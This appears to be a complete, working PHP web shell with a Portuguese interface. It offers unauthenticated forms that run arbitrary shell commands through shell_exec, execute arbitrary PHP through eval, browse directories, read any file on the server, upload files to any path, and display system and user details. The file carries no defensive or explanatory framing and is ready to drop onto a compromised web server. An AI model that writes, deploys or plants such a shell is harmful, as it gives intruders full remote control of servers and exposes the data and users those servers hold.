<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Shell PHP</title>
    <style>
        :root {
            --bg-color: #1a1a1a;
            --content-bg: #2d2d2d;
            --text-color: #e0e0e0;
            --primary-color: #007bff;
            --secondary-color: #0056b3;
            --border-color: #444;
            --card-bg: #333;
            --code-bg: #1e1e1e;
            --code-color: #d4d4d4;
            --success-color: #28a745;
            --warning-color: #ffc107;
            --danger-color: #dc3545;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            line-height: 1.7;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 2rem 0;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 2rem;
        }

        header {
            text-align: center;
            margin-bottom: 3rem;
        }

        h1 {
            font-size: 2.5em;
            color: #ffffff;
            margin-bottom: 0.5em;
        }

        .subtitle {
            font-size: 1.2em;
            color: #aaa;
            margin-bottom: 2rem;
        }

        .section {
            margin-bottom: 2rem;
            padding: 1.5rem;
            background-color: var(--card-bg);
            border-radius: 8px;
            border: 1px solid var(--border-color);
        }

        .section h2 {
            color: #ffffff;
            margin-top: 0;
            margin-bottom: 1rem;
            border-bottom: 1px solid var(--border-color);
            padding-bottom: 0.5rem;
        }

        .form-group {
            margin-bottom: 1rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            color: #bbb;
        }

        input[type="text"],
        input[type="password"],
        textarea {
            width: 100%;
            padding: 0.8rem;
            border: 1px solid var(--border-color);
            border-radius: 5px;
            background-color: var(--code-bg);
            color: var(--code-color);
            font-family: monospace;
            font-size: 1em;
        }

        textarea {
            height: 200px;
            resize: vertical;
        }

        .btn {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 0.8rem 1.5rem;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1em;
            font-weight: 500;
            transition: background-color 0.2s;
        }

        .btn:hover {
            background-color: var(--secondary-color);
        }

        .btn-danger {
            background-color: var(--danger-color);
        }

        .btn-danger:hover {
            background-color: #c82333;
        }

        .output {
            background-color: var(--code-bg);
            padding: 1rem;
            border-radius: 5px;
            margin-top: 1rem;
            white-space: pre-wrap;
            font-family: monospace;
            overflow-x: auto;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1.5rem;
        }

        .info-card {
            background-color: var(--content-bg);
            border-radius: 8px;
            padding: 1rem;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
        }

        .info-item {
            margin-bottom: 0.5rem;
        }

        .info-label {
            font-weight: 600;
            color: #bbb;
        }

        .info-value {
            color: #e0e0e0;
        }

        .file-list {
            list-style: none;
            padding: 0;
        }

        .file-list li {
            padding: 0.5rem;
            border-bottom: 1px solid var(--border-color);
        }

        .file-list li:hover {
            background-color: var(--code-bg);
        }

        .file-link {
            color: var(--primary-color);
            text-decoration: none;
        }

        .file-link:hover {
            text-decoration: underline;
        }

        .error {
            background-color: rgba(220, 53, 69, 0.1);
            border: 1px solid var(--danger-color);
            color: var(--danger-color);
            padding: 1rem;
            border-radius: 5px;
            margin-bottom: 1rem;
        }

        .success {
            background-color: rgba(40, 167, 69, 0.1);
            border: 1px solid var(--success-color);
            color: var(--success-color);
            padding: 1rem;
            border-radius: 5px;
            margin-bottom: 1rem;
        }

        .hidden {
            display: none;
        }

        .command-history {
            margin-top: 1rem;
        }

        .history-item {
            padding: 0.5rem;
            border-bottom: 1px solid var(--border-color);
            font-family: monospace;
        }

        @media (max-width: 768px) {
            .container {
                padding: 0 1rem;
            }
            
            h1 {
                font-size: 2em;
            }

            .info-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Web Shell PHP</h1>
            <p class="subtitle">Interface para execução de comandos no servidor</p>
        </header>

        <div class="section">
            <h2>Executar Comando</h2>
            <form method="post" id="commandForm">
                <div class="form-group">
                    <label for="command">Comando:</label>
                    <input type="text" id="command" name="command" placeholder="Digite o comando a ser executado..." value="<?php echo isset($_POST['command']) ? htmlspecialchars($_POST['command']) : ''; ?>">
                </div>
                <button type="submit" class="btn">Executar Comando</button>
                <button type="button" class="btn" onclick="clearOutput()">Limpar Saída</button>
            </form>

            <?php
            if (isset($_POST['command']) && !empty($_POST['command'])) {
                $command = $_POST['command'];
                $output = shell_exec($command . ' 2>&1'); // Captura stdout e stderr
                echo '<div class="output">'; 
                echo '<strong>Comando:</strong> ' . htmlspecialchars($command) . "\n";
                echo '<strong>Saída:</strong>' . "\n" . htmlspecialchars($output);
                echo '</div>';
            }
            ?>
        </div>

        <div class="section">
            <h2>Informações do Servidor</h2>
            <div class="info-grid">
                <div class="info-card">
                    <div class="info-item">
                        <span class="info-label">Sistema Operacional:</span>
                        <span class="info-value"><?php echo php_uname('s'); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Versão do Kernel:</span>
                        <span class="info-value"><?php echo php_uname('r'); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Hostname:</span>
                        <span class="info-value"><?php echo php_uname('n'); ?></span>
                    </div>
                </div>
                <div class="info-card">
                    <div class="info-item">
                        <span class="info-label">Versão do PHP:</span>
                        <span class="info-value"><?php echo phpversion(); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Servidor Web:</span>
                        <span class="info-value"><?php echo $_SERVER['SERVER_SOFTWARE'] ?? 'Desconhecido'; ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Diretório Atual:</span>
                        <span class="info-value"><?php echo getcwd(); ?></span>
                    </div>
                </div>
                <div class="info-card">
                    <div class="info-item">
                        <span class="info-label">Usuário:</span>
                        <span class="info-value"><?php echo get_current_user(); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">UID:</span>
                        <span class="info-value"><?php echo function_exists('posix_getuid') ? posix_getuid() : 'N/A'; ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">GID:</span>
                        <span class="info-value"><?php echo function_exists('posix_getgid') ? posix_getgid() : 'N/A'; ?></span>
                    </div>
                </div>
            </div>
        </div>

        <div class="section">
            <h2>Lista de Arquivos</h2>
            <form method="post">
                <div class="form-group">
                    <label for="directory">Diretório:</label>
                    <input type="text" id="directory" name="directory" value="<?php echo isset($_POST['directory']) ? htmlspecialchars($_POST['directory']) : getcwd(); ?>">
                </div>
                <button type="submit" class="btn">Listar Arquivos</button>
            </form>

            <?php
            if (isset($_POST['directory'])) {
                $dir = $_POST['directory'];
                if (is_dir($dir)) {
                    $files = scandir($dir);
                    echo '<ul class="file-list">';
                    foreach ($files as $file) {
                        if ($file != '.' && $file != '..') {
                            $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
                            $type = is_dir($fullPath) ? '[DIR]' : '[FILE]';
                            echo '<li>';
                            echo $type . ' ';
                            echo '<a href="?file=' . urlencode($fullPath) . '" class="file-link" target="_blank">' . htmlspecialchars($file) . '</a>';
                            echo ' (' . (is_file($fullPath) ? filesize($fullPath) . ' bytes' : 'Dir') . ')';
                            echo '</li>';
                        }
                    }
                    echo '</ul>';
                } else {
                    echo '<div class="error">Diretório não encontrado ou não é um diretório.</div>';
                }
            }
            ?>
        </div>

        <div class="section">
            <h2>Upload de Arquivo</h2>
            <form method="post" enctype="multipart/form-data">
                <div class="form-group">
                    <label for="uploadFile">Arquivo:</label>
                    <input type="file" id="uploadFile" name="uploadFile">
                </div>
                <div class="form-group">
                    <label for="uploadPath">Caminho de Destino:</label>
                    <input type="text" id="uploadPath" name="uploadPath" value="<?php echo getcwd(); ?>">
                </div>
                <button type="submit" name="upload" class="btn">Fazer Upload</button>
            </form>

            <?php
            if (isset($_POST['upload']) && isset($_FILES['uploadFile'])) {
                $uploadDir = $_POST['uploadPath'];
                $uploadFile = $uploadDir . DIRECTORY_SEPARATOR . basename($_FILES['uploadFile']['name']);

                if (move_uploaded_file($_FILES['uploadFile']['tmp_name'], $uploadFile)) {
                    echo '<div class="success">Arquivo enviado com sucesso para: ' . htmlspecialchars($uploadFile) . '</div>';
                } else {
                    echo '<div class="error">Erro ao fazer upload do arquivo.</div>';
                }
            }
            ?>
        </div>

        <div class="section">
            <h2>Conteúdo de Arquivo</h2>
            <form method="get">
                <div class="form-group">
                    <label for="viewFile">Caminho do Arquivo:</label>
                    <input type="text" id="viewFile" name="file" value="<?php echo isset($_GET['file']) ? htmlspecialchars($_GET['file']) : ''; ?>">
                </div>
                <button type="submit" class="btn">Visualizar Arquivo</button>
            </form>

            <?php
            if (isset($_GET['file'])) {
                $file = $_GET['file'];
                if (is_file($file)) {
                    $content = file_get_contents($file);
                    if ($content !== false) {
                        echo '<div class="output">';
                        echo htmlspecialchars($content);
                        echo '</div>';
                    } else {
                        echo '<div class="error">Não foi possível ler o arquivo.</div>';
                    }
                } else {
                    echo '<div class="error">Arquivo não encontrado ou não é um arquivo.</div>';
                }
            }
            ?>
        </div>

        <div class="section">
            <h2>Executar PHP</h2>
            <form method="post">
                <div class="form-group">
                    <label for="phpCode">Código PHP:</label>
                    <textarea id="phpCode" name="phpCode"><?php echo isset($_POST['phpCode']) ? htmlspecialchars($_POST['phpCode']) : ''; ?></textarea>
                </div>
                <button type="submit" name="executePhp" class="btn">Executar PHP</button>
            </form>

            <?php
            if (isset($_POST['executePhp']) && isset($_POST['phpCode'])) {
                $phpCode = $_POST['phpCode'];
                echo '<div class="output">';
                echo '<strong>Código Executado:</strong>' . "\n" . htmlspecialchars($phpCode) . "\n\n";
                echo '<strong>Saída:</strong>' . "\n";
                ob_start();
                try {
                    eval('?>' . $phpCode);
                } catch (Exception $e) {
                    echo 'Erro: ' . $e->getMessage();
                }
                $output = ob_get_contents();
                ob_end_clean();
                echo htmlspecialchars($output);
                echo '</div>';
            }
            ?>
        </div>

        <div class="section">
            <h2>Informações de Processo</h2>
            <form method="post">
                <div class="form-group">
                    <label for="psCommand">Comando para Listar Processos:</label>
                    <input type="text" id="psCommand" name="psCommand" value="<?php echo isset($_POST['psCommand']) ? htmlspecialchars($_POST['psCommand']) : 'ps aux'; ?>">
                </div>
                <button type="submit" name="showProcesses" class="btn">Mostrar Processos</button>
            </form>

            <?php
            if (isset($_POST['showProcesses']) && isset($_POST['psCommand'])) {
                $psCommand = $_POST['psCommand'];
                $psOutput = shell_exec($psCommand . ' 2>&1');
                echo '<div class="output">';
                echo '<strong>Comando:</strong> ' . htmlspecialchars($psCommand) . "\n";
                echo '<strong>Saída:</strong>' . "\n" . htmlspecialchars($psOutput);
                echo '</div>';
            }
            ?>
        </div>

        <div class="section">
            <h2>Rede</h2>
            <form method="post">
                <div class="form-group">
                    <label for="networkCommand">Comando de Rede (ex: ifconfig, ip addr, netstat):</label>
                    <input type="text" id="networkCommand" name="networkCommand" value="<?php echo isset($_POST['networkCommand']) ? htmlspecialchars($_POST['networkCommand']) : 'ifconfig'; ?>">
                </div>
                <button type="submit" name="showNetwork" class="btn">Executar Comando de Rede</button>
            </form>

            <?php
            if (isset($_POST['showNetwork']) && isset($_POST['networkCommand'])) {
                $netCommand = $_POST['networkCommand'];
                $netOutput = shell_exec($netCommand . ' 2>&1');
                echo '<div class="output">';
                echo '<strong>Comando:</strong> ' . htmlspecialchars($netCommand) . "\n";
                echo '<strong>Saída:</strong>' . "\n" . htmlspecialchars($netOutput);
                echo '</div>';
            }
            ?>
        </div>
    </div>

    <script>
        function clearOutput() {
            const outputs = document.querySelectorAll('.output');
            outputs.forEach(output => output.remove());
        }

        // Auto-scroll to output after command execution
        window.addEventListener('load', function() {
            if (document.querySelector('.output')) {
                document.querySelector('.output').scrollIntoView({ behavior: 'smooth' });
            }
        });

        // Command history (simple client-side)
        const commandForm = document.getElementById('commandForm');
        if (commandForm) {
            commandForm.addEventListener('submit', function() {
                const commandInput = document.getElementById('command');
                if (commandInput.value.trim() !== '') {
                    // In a real implementation, you'd send this to the server
                    // For now, just show in console
                    console.log('Executando comando:', commandInput.value);
                }
            });
        }
    </script>
</body>
</html>